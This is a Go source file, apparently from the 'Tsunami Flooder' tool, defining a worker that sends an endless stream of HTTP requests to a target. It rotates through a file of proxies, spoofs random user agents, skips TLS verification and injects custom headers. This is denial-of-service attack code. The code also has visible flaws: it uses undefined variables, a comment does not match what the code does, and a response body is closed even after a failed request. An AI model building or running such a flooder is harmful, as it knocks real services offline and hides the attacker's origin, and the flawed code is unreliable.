package main

import (
	"bytes"
	"net/http"
	"crypto/tls"
	"net/url"
	"bufio"
	"fmt"
	"log"
	"math/rand"
	"os"
	"time"
)

type floodWorker struct {
	dead           bool
	exitChan       chan int
	id             int
	RequestCounter int
}

var (
	proxyList []string
	random3     *rand.Rand
	source3     rand.Source
)

func (fw *floodWorker) Start() {

//Load user agents from file
			file, err := os.Open(*proxyListFile)
			if err != nil {
				//File not found, or whatever, use default UA
				proxyList = append(proxyList, "Tsunami Flooder (https://github.com/ammar/tsunami)")
				fmt.Println(err)
			} else {
				defer file.Close()
				scanner := bufio.NewScanner(file)
				for scanner.Scan() {
					proxyList = append(proxyList, scanner.Text())
				}
				if err := scanner.Err(); err != nil {
					log.Fatal(err)
				}
			}
			
			
	go func() {
		defer fw.Kill()
		client := &http.Client{}
		if scheme == "https" {

		}
		
		for {
			if fw.dead {
				return
			}
			
			
			//Initiate random number generator
			source3 = rand.NewSource(time.Now().UnixNano())
			random3 = rand.New(source3)
			index := int(random.Uint32()) % len(proxyList)

			//creating the proxyURL
			proxyStr := proxyList[index]
			proxyURL, err := url.Parse(proxyStr)
			if err != nil {
				lastErr = err.Error()
			}
	
			//Skip certificate verify for performance
			secureTransport := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				Proxy: http.ProxyURL(proxyURL),
			}
			client = &http.Client{Transport: secureTransport}

			body := []byte(tokenizedBody.String())
			req, _ := http.NewRequest(*method, tokenizedTarget.String(), bytes.NewBuffer(body))
			req.Header.Set("User-Agent", getRandomUserAgent())
			if *method == "POST" {
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			}
			//Inject custom headers right before sending
			injectHeaders(req)
			resp, err := client.Do(req)
			if err != nil {
				lastErr = err.Error()
			}
			// Close body to prevent a "too many files open" error
			err = resp.Body.Close()
			if err != nil && lastErr == "" {
				lastErr = err.Error()
			}
			fw.RequestCounter += 1 //Worker specific counter
			requestChan <- true
		}
	}()
}

func (fw *floodWorker) Kill() {
	fw.dead = true
	fw.exitChan <- fw.id
}
